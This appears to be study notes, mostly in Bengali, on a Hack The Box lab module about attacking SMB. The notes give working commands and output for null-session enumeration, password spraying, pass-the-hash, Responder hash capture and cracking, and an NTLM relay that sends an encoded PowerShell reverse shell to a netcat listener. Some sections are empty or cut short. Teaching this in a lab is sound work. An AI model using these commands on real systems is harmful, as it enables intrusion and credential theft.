# Attacking SMB - [LINK](https://academy.hackthebox.com/app/module/116/section/1167)


## Introduction (ভূমিকা)

**SMB (Server Message Block)** হলো এমন একটি কমিউনিকেশন প্রোটোকল যা নেটওয়ার্কে থাকা বিভিন্ন নোডের (কম্পিউটার বা ডিভাইস) মধ্যে ফাইল এবং প্রিন্টার শেয়ার করার জন্য তৈরি করা হয়েছে।

* **শুরুর দিকে:** এটি প্রথমে TCP/IP-এর ওপর থাকা NetBIOS (যাকে NBT বলা হয়) ব্যবহার করে তৈরি করা হয়েছিল। তখন এটি TCP পোর্ট 139 এবং UDP পোর্ট 137 ও 138 ব্যবহার করত।
* **বর্তমানে:** Windows 2000-এর পর থেকে Microsoft একটি নতুন অপশন যোগ করে, যার মাধ্যমে অতিরিক্ত NetBIOS লেয়ার ছাড়াই SMB সরাসরি TCP/IP-এর ওপর **পোর্ট 445** ব্যবহার করে চলতে পারে। আধুনিক Windows সিস্টেমগুলো সাধারণত পোর্ট 445-এ SMB ব্যবহার করে, তবে ব্যাকআপ বা ফেইলওভার (failover) হিসেবে এখনও NetBIOS সাপোর্ট করে।

**Samba কী?**
Samba হলো Unix/Linux-ভিত্তিক অপারেটিং সিস্টেমের জন্য SMB প্রোটোকলের একটি ওপেন সোর্স (open-source) রূপ। এর মাধ্যমে Linux/Unix সার্ভার এবং Windows ক্লায়েন্টরা একে অপরের সাথে একই SMB সার্ভিস ব্যবহার করে ফাইল শেয়ার করতে পারে।

> **সহজভাবে:** যদি আমরা কোনো Windows হোস্টে দেখি SMB পোর্ট 445-এ চলছে, তার মানে এটি NetBIOS ছাড়াই সরাসরি TCP/IP-তে চলছে। কিন্তু যদি Windows-এ NetBIOS চালু থাকে অথবা আমরা কোনো নন-উইন্ডোজ (non-Windows) হোস্টকে টার্গেট করি, তবে আমরা দেখব SMB পোর্ট 139-এ চলছে (অর্থাৎ NetBIOS-এর মাধ্যমে চলছে)।

**MSRPC (Microsoft Remote Procedure Call):**
SMB-এর সাথে ঘনিষ্ঠভাবে যুক্ত আরেকটি প্রোটোকল হলো MSRPC।

* **এটি কী করে:** RPC অ্যাপ্লিকেশন ডেভেলপারদের এমন একটি সুবিধা দেয় যার মাধ্যমে তারা লোকাল বা রিমোট প্রসেসে কোনো ফাংশন বা প্রসিডিউর রান করাতে পারে। এর জন্য ডেভেলপারদের ব্যাকগ্রাউন্ডে নেটওয়ার্ক প্রোটোকল কীভাবে কাজ করছে তা জানার প্রয়োজন হয় না।
* এটি MS-RPCE দ্বারা স্পেসিফাই করা আছে, যা নির্দেশ করে যে RPC আন্ডারলায়িং ট্রান্সপোর্ট (underlying transport) হিসেবে SMB প্রোটোকলের *named pipes* ব্যবহার করতে পারে।

### অ্যাটাকের মূল ধারণা

SMB সার্ভারে অ্যাটাক করার জন্য আমাদের বুঝতে হবে এটি কীভাবে কাজ করে, এর অপারেটিং সিস্টেম কী এবং কোন কোন টুল ব্যবহার করে আমরা এর অপব্যবহার (abuse) করতে পারি। অন্যান্য সার্ভিসের মতো এখানেও আমরা এর মিসকনফিগারেশন বা অতিরিক্ত পারমিশনের সুযোগ নিই অথবা কোনো দুর্বলতা (vulnerabilities) এক্সপ্লয়েট করি।

* অ্যাক্সেস পাওয়ার পর যদি আমরা কোনো শেয়ার্ড ফোল্ডার পাই, তবে আমাদের দেখতে হবে সেখানে কী কী কন্টেন্ট আছে।
* আর যদি আমরা NetBIOS বা RPC-কে টার্গেট করি, তবে আমাদের দেখতে হবে টার্গেট থেকে আমরা কী তথ্য পেতে পারি বা কী কমান্ড রান করাতে পারি।

## Enumeration (এনুমারেশন বা তথ্য সংগ্রহ)

SMB-এর ইমপ্লিমেন্টেশন এবং অপারেটিং সিস্টেমের ওপর ভিত্তি করে Nmap স্ক্যান থেকে আমরা বিভিন্ন ধরনের তথ্য পেতে পারি।

**গুরুত্বপূর্ণ নোট:** Windows OS-কে টার্গেট করার সময় Nmap সাধারণত স্ক্যানের রেজাল্টে ভার্সন ইনফরমেশন দিতে পারে না। এর বদলে Nmap OS-এর ভার্সনটি অনুমান (guess) করার চেষ্টা করে। টার্গেটে কোনো নির্দিষ্ট এক্সপ্লয়েট কাজ করবে কি না, তা জানার জন্য আমাদের প্রায়ই অন্য স্ক্যান ব্যবহার করতে হয়।

চলুন এখন পোর্ট 139 এবং 445 স্ক্যান করে দেখি:

### Nmap Scan Example

## Misconfigurations (মিসকনফিগারেশন)

অনেক সময় SMB এমনভাবে কনফিগার করা থাকে যেখানে লগইন করার জন্য কোনো ইউজারনেম বা পাসওয়ার্ড লাগে না। একে বলা হয় **null session** বা অ্যানোনিমাস অথেনটিকেশন (Anonymous Authentication)।

### Anonymous Authentication

যদি আমরা এমন কোনো SMB সার্ভার পাই যেখানে পাসওয়ার্ড লাগে না (অথবা আমরা যদি ভ্যালিড ক্রেডেনশিয়াল পাই), তবে আমরা সেখান থেকে সার্ভারের শেয়ার, ইউজারনেম, গ্রুপ, পারমিশন, পলিসি এবং সার্ভিসের একটি লিস্ট বের করতে পারি।

`smbclient`, `smbmap`, `rpcclient` বা `enum4linux` এর মতো বেশিরভাগ টুলই নাল সেশন (null session) কানেক্টিভিটি অ্যালাউ করে।

### File Share Enumeration (ফাইল শেয়ার এনুমারেট করা)

**1. `smbclient` ব্যবহার করে:**
আমরা সার্ভারের শেয়ারগুলোর লিস্ট দেখতে `-L` অপশন এবং নাল সেশন ব্যবহার করতে `-N` অপশন ব্যবহার করতে পারি।

```bash
00Luffy00@htb[/htb]$ smbclient -N -L //10.129.14.128

        Sharename       Type      Comment
        -------      --     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        notes           Disk      CheckIT
        IPC$            IPC       IPC Service (DEVSM)
SMB1 disabled no workgroup available

```

*(এখানে `ADMIN$`, `C$`, `notes` এবং `IPC$` নামের শেয়ার দেখা যাচ্ছে)।*

**2. `smbmap` ব্যবহার করে:**
এটি নেটওয়ার্ক শেয়ার এবং তার পারমিশনগুলো দেখার জন্য চমৎকার একটি টুল। এর বড় সুবিধা হলো এটি প্রতিটি শেয়ার্ড ফোল্ডারে আমাদের কী পারমিশন আছে তা পরিষ্কারভাবে দেখিয়ে দেয়।

```bash
00Luffy00@htb[/htb]$ smbmap -H 10.129.14.128

[+] IP: 10.129.14.128:445     Name: 10.129.14.128                                   
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       IPC Service (DEVSM)
        notes                                                   READ, WRITE     CheckIT

```

*(এখানে দেখা যাচ্ছে `notes` শেয়ারে আমাদের `READ, WRITE` পারমিশন আছে)।*

**ডিরেক্টরির ভেতরে দেখা (Recursive scan):**
`-r` বা `-R` অপশন ব্যবহার করে আমরা ডিরেক্টরির ভেতরের সব ফাইল ও ফোল্ডার দেখতে পারি।

```bash
00Luffy00@htb[/htb]$ smbmap -H 10.129.14.128 -r notes

[+] Guest session       IP: 10.129.14.128:445    Name: 10.129.14.128                           
        Disk                                                    Permissions     Comment
        --                                                   ---------    -------
        notes                                                   READ, WRITE
        .\notes\*
        dr--r--r               0 Mon Nov  2 00:57:44 2020    .
        dr--r--r               0 Mon Nov  2 00:57:44 2020    ..
        dr--r--r               0 Mon Nov  2 00:57:44 2020    LDOUJZWBSG
        fw--w--w             116 Tue Apr 16 07:43:19 2019    note.txt
        fr--r--r               0 Fri Feb 22 07:43:28 2019    SDT65CB.tmp
        dr--r--r               0 Mon Nov  2 00:54:57 2020    TPLRNSMWHQ
        dr--r--r               0 Mon Nov  2 00:56:51 2020    WDJEQFZPNO
        dr--r--r               0 Fri Feb 22 07:44:02 2019    WindowsImageBackup

```

**ফাইল ডাউনলোড এবং আপলোড করা:**
যেহেতু `notes` শেয়ারে আমাদের READ এবং WRITE পারমিশন আছে, তাই আমরা ফাইল ডাউনলোড ও আপলোড করতে পারি।

*ডাউনলোড করার কমান্ড:*

```bash
00Luffy00@htb[/htb]$ smbmap -H 10.129.14.128 --download "notes\note.txt"

[+] Starting download: notes\note.txt (116 bytes)
[+] File output to: /htb/10.129.14.128-notes_note.txt

```

*আপলোড করার কমান্ড:*

```bash
00Luffy00@htb[/htb]$ smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"

[+] Starting upload: test.txt (20 bytes)
[+] Upload complete.

```

## Remote Procedure Call (RPC) Enumeration

আমরা `rpcclient` টুল ব্যবহার করে একটি নাল সেশন (null session) তৈরি করে ওয়ার্কস্টেশন বা ডোমেইন কন্ট্রোলার এনুমারেট করতে পারি।

`rpcclient` টুলে অনেকগুলো কমান্ড থাকে যা দিয়ে আমরা SMB সার্ভারে নির্দিষ্ট ফাংশন রান করিয়ে তথ্য সংগ্রহ করতে পারি বা সার্ভারের অ্যাট্রিবিউট (যেমন: ইউজারনেম) পরিবর্তন করতে পারি।
*(এর কমান্ডগুলোর লিস্ট পেতে SANS Institute-এর চিটশিট বা `rpcclient`-এর ম্যান পেজ দেখা যেতে পারে)।*

**`rpcclient` Example:**

```bash
00Luffy00@htb[/htb]$ rpcclient -U'%' 10.10.110.17

rpcclient $> enumdomusers

user:[mhope] rid:[0x641]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]

```

*(এখানে `-U'%'` দিয়ে নাল সেশন তৈরি করা হয়েছে এবং `enumdomusers` কমান্ড দিয়ে ডোমেইনের ইউজারদের লিস্ট বের করা হয়েছে)।*

**Enum4linux:**
এটি আরেকটি দারুণ ইউটিলিটি যা নাল সেশন সাপোর্ট করে। এটি `nmblookup`, `net`, `rpcclient`, এবং `smbclient` ব্যবহার করে SMB টার্গেট থেকে স্বয়ংক্রিয়ভাবে নিচের তথ্যগুলো বের করে আনে:

* Workgroup/Domain নাম
* Users ইনফরমেশন
* Operating system ইনফরমেশন
* Groups ইনফরমেশন
* Shares ফোল্ডার
* Password policy ইনফরমেশন

*(মূল টুলটি Perl-এ লেখা ছিল, পরবর্তীতে Mark Lowe এটি Python-এ `enum4linux-ng` নামে নতুন করে লিখেছেন)।*

## Protocol Specifics Attacks (প্রোটোকল ভিত্তিক অ্যাটাক)

যদি নাল সেশন (null session) এনাবল করা না থাকে, তবে SMB প্রোটোকলের সাথে ইন্টারঅ্যাক্ট করতে আমাদের ক্রেডেনশিয়াল (ইউজারনেম ও পাসওয়ার্ড) লাগবে। ক্রেডেনশিয়াল পাওয়ার দুটি সাধারণ উপায় হলো: **Brute Forcing** এবং **Password Spraying**।

### Brute Forcing vs. Password Spraying

* **Brute Forcing:** এখানে আমরা একটি মাত্র অ্যাকাউন্টের বিপরীতে ডিকশনারির হাজার হাজার পাসওয়ার্ড ট্রাই করি। এর বড় সমস্যা হলো, যদি সার্ভারে 'Account Lockout' থ্রেশহোল্ড সেট করা থাকে, তবে কয়েকবার ভুল পাসওয়ার্ড দিলেই অ্যাকাউন্টটি লক হয়ে যাবে। তাই থ্রেশহোল্ড জানা না থাকলে ব্রুট ফোর্স করা রেকমেন্ডেড নয়।
* **Password Spraying:** এটি ব্রুট ফোর্সের চেয়ে অনেক ভালো পদ্ধতি। এখানে আমরা একটি মাত্র কমন পাসওয়ার্ড (যেমন: `Company01!`) ব্যবহার করে অনেকগুলো ইউজারনেমের লিস্টে ট্রাই করি। এর ফলে অ্যাকাউন্ট লক হওয়ার সম্ভাবনা থাকে না।

আমরা **CrackMapExec (CME)** টুল ব্যবহার করে খুব সহজেই Password Spraying করতে পারি।

## SMB Attacks (Windows vs Linux)

Linux এবং Windows-এ SMB সার্ভারে অ্যাটাক করার ধরন ভিন্ন হয়।

* **Linux-এ:** সাধারণত আমরা শুধু ফাইল সিস্টেমের অ্যাক্সেস পাই, প্রিভিলেজ অ্যাবিউজ করি বা কোনো জানা দুর্বলতা এক্সপ্লয়েট করি।
* **Windows-এ:** অ্যাটাক সারফেস অনেক বড়। আমরা যে ইউজারের অ্যাক্সেস পেয়েছি তার প্রিভিলেজের ওপর ভিত্তি করে আমরা অনেক কিছু করতে পারি। ইউজার যদি অ্যাডমিনিস্ট্রেটর হয়, তবে আমরা নিচের কাজগুলো করতে পারি:
* Remote Command Execution (দূর থেকে কমান্ড রান করা)
* SAM ডাটাবেস থেকে হ্যাশ এক্সট্র্যাক্ট করা
* লগইন করা ইউজারদের এনুমারেট করা
* Pass-the-Hash (PTH) অ্যাটাক করা



---

### Remote Code Execution (RCE) - PsExec

দূর থেকে কোনো সিস্টেমে কমান্ড এক্সিকিউট করার জন্য **PsExec** খুব জনপ্রিয় একটি টুল। এটি ১৯৯৬ সালে Mark Russinovich এবং Bryce Cogswell দ্বারা তৈরি করা **Sysinternals** স্যুটের অংশ, যা পরে Microsoft কিনে নেয়।

**PsExec কীভাবে কাজ করে?**
এটি রিমোট মেশিনে ক্লায়েন্ট সফটওয়্যার ইন্সটল না করেই প্রসেস এক্সিকিউট করতে পারে। এর নিজস্ব এক্সিকিউটেবল ফাইলের ভেতরে একটি Windows service ইমেজ থাকে।

1. এটি প্রথমে রিমোট মেশিনের `admin$` শেয়ারে ওই সার্ভিসটি ডিপ্লয় করে।
2. এরপর SMB-এর ওপর DCE/RPC ইন্টারফেস ব্যবহার করে Windows Service Control Manager API-তে অ্যাক্সেস নেয়।
3. এরপর রিমোট মেশিনে PSExec সার্ভিসটি চালু করে, যা একটি *named pipe* তৈরি করে। এই পাইপটি ব্যবহার করেই মূলত সিস্টেমে কমান্ড পাঠানো হয়।

Linux-এর জন্য Impacket-এর বেশ কিছু ইমপ্লিমেন্টেশন রয়েছে:

* `impacket-psexec`: এটি `RemComSvc` ব্যবহার করে PsExec-এর মতো কাজ করে।
* `impacket-smbexec`: এটি লোকাল একটি SMB সার্ভার তৈরি করে কমান্ডের আউটপুট রিসিভ করে। রিমোট মেশিনে writeable শেয়ার না থাকলে এটি খুব কাজের।
* `impacket-atexec`: এটি Task Scheduler সার্ভিসের মাধ্যমে কমান্ড এক্সিকিউট করে।

### Extract Hashes from SAM Database (SAM ডাটাবেস থেকে হ্যাশ চুরি করা)

**SAM (Security Account Manager)** হলো এমন একটি ডাটাবেস যেখানে ইউজারদের পাসওয়ার্ডের হ্যাশ স্টোর করা থাকে। যদি আমরা কোনো মেশিনের অ্যাডমিন প্রিভিলেজ পেয়ে যাই, তবে আমরা SAM ডাটাবেস থেকে হ্যাশগুলো এক্সট্র্যাক্ট করতে পারি।

1. অন্য ইউজার হিসেবে অথেনটিকেট করতে পারি।

### Pass-the-Hash (PtH)

যদি আমরা কোনো ইউজারের NTLM হ্যাশ পাই কিন্তু সেটি ক্র্যাক করতে না পারি, তাহলেও কোনো সমস্যা নেই। আমরা সরাসরি ওই হ্যাশটি ব্যবহার করেই SMB-এর মাধ্যমে সার্ভারে লগইন করতে পারি। এই পদ্ধতিকেই **Pass-the-Hash** বলা হয়।

CME-তে `-p` (পাসওয়ার্ড) এর বদলে `-H` (হ্যাশ) ব্যবহার করে আমরা এটি করতে পারি:

```bash
00L00@htb[/htb]$ crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE

SMB         10.10.110.17 445    WIN7BOX  [*] Windows 10.0 Build 19041 (name:WIN7BOX) (domain:WIN7BOX) (signing:False) (SMBv1:False)
SMB         10.10.110.17 445    WIN7BOX  [+] WIN7BOX\Administrator:2B576ACBE6BCFDA7294D6BD18041B8FE (Pwn3d!)

```

## Forced Authentication Attacks (জোরপূর্বক অথেনটিকেশন করানো)

আমরা চাইলে একটি ফেইক (fake) SMB সার্ভার তৈরি করে ইউজারদের বোকা বানাতে পারি এবং তাদের NetNTLM v1/v2 হ্যাশ ক্যাপচার করতে পারি।

এর জন্য সবচেয়ে জনপ্রিয় টুল হলো **Responder**।
**Responder কী করে?**
এটি একটি LLMNR, NBT-NS এবং MDNS পয়জনিং টুল। এটি নেটওয়ার্কে কান পেতে থাকে। যখন কোনো ইউজার ভুল কোনো নাম লিখে সার্চ দেয় (যেমন `\\mysharedfolder\` এর বদলে ভুল করে `\\mysharefoder\` লেখে), তখন মেশিনটি ওই ভুল নামটি নেটওয়ার্কের সবার কাছে জিজ্ঞেস করে (multicast query)।

Responder তখন ওই সার্ভার সেজে মেশিনটিকে মিথ্যে উত্তর দেয় এবং ইউজারের হ্যাশটি ক্যাপচার করে নেয়।

**Responder রান করা:**

```bash
00Luffy00@htb[/htb]$ sudo responder -I ens33

```

*(এখানে `-I` দিয়ে ইন্টারফেসের নাম দেওয়া হয়েছে)।*

### হ্যাশ ক্র্যাক করা (Hashcat)

এই হ্যাশগুলো Responder-এর লগ ডিরেক্টরিতে (`/usr/share/responder/logs/`) সেভ থাকে। আমরা Hashcat-এর `5600` মডিউল ব্যবহার করে এটি ক্র্যাক করতে পারি:

```bash
00Luffy00@htb[/htb]$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

```

*(আউটপুটে দেখা যাবে হ্যাশটি ক্র্যাক হয়ে `P@ssword` বের হয়েছে)।*

### NTLM Relay Attack

যদি হ্যাশটি ক্র্যাক করা সম্ভব না হয়, তবে আমরা `impacket-ntlmrelayx` বা `Responder MultiRelay.py` ব্যবহার করে এই হ্যাশটিকে অন্য মেশিনে রিলে (relay) করে অথেনটিকেট করতে পারি।

**1. Responder-এ SMB বন্ধ করা:**
প্রথমে আমাদের `/etc/responder/Responder.conf` ফাইলে গিয়ে `SMB = Off` করে দিতে হবে, যাতে আমাদের রিলে টুলটি পোর্ট 445 ব্যবহার করতে পারে।

**2. ntlmrelayx রান করা:**
আমরা `impacket-ntlmrelayx` রান করব এবং টার্গেট মেশিন হিসেবে `-t 10.10.110.146` দেব। ডিফল্টভাবে এটি SAM ডাটাবেস ডাম্প করবে।

```bash
00Luffy00@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

```

**3. রিভার্স শেল (Reverse Shell) নেওয়া:**
আমরা চাইলে `-c` অপশন ব্যবহার করে রিভার্স শেল তৈরি করার জন্য Base64 এনকোড করা একটি PowerShell কমান্ডও পাঠাতে পারি।

```bash
00Luffy00@htb[/htb]$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIAB...<Base64_Payload>...'

```

এরপর যখন ভিকটিম আমাদের সার্ভারে অথেনটিকেট করবে, তখন আমাদের পাঠানো কমান্ডটি রান হবে এবং আমরা Netcat-এ একটি শেল পেয়ে যাব:

```bash
00Luffy00@htb[/htb]$ nc -lvnp 9001

listening on [any] 9001 ...
connect to [10.10.110.133] from (UNKNOWN) [10.10.110.146] 52471

PS C:\Windows\system32> whoami;hostname

nt authority\system
WIN11BOX

```
